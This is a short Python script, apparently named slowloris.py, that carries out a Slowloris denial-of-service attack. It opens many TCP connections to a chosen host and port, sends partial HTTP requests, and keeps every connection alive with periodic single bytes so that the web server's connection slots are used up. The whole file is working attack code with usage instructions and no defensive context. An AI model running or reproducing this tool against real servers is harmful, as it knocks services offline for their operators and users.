#!/usr/bin/env python3

import socket
import sys
import time

def create_socket_connection(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    # Send the first part of a HTTP GET request
    s.sendall(b'GET / HTTP/1.1 ')
    # Set socket to be non blocking so we can easily tell if it's open or closed later
    s.setblocking(False)
    return s

def main():
    # Command line argument boilerplate
    if len(sys.argv) != 4:
        print('Usage: python3 slowloris.py {HOST} {PORT} {NUMBER_OF_CONNECTIONS}')
        sys.exit(1)
        
    host, port, number_of_connections = sys.argv[1:]
           
    # Create a list to store all our connections so we can loop over them later
    socket_pool = []

    # Create a bunch of connections to the target
    for _ in range(int(number_of_connections)):
        s = create_socket_connection(host, int(port))
        socket_pool.append(s)
                 
    # Try to keep our connections alive forever
    while True:
        for s in list(socket_pool):
            try:
                # Try and read some data from the connection
                d = s.recv(1024)
                if not d:
                    # No data could be read so raise a socket.error
                    raise socket.error
            except BlockingIOError:
                # Reading data raised a BlockingIOError so the connection is still open. Keep sending data!
                s.sendall(b' ')
            except socket.error:
                # The connection has died so create a new one
                socket_pool.remove(s)
                s = create_socket_connection(host, int(port))
                socket_pool.append(s)      
        time.sleep(1)
    
if __name__ == "__main__":
    main()
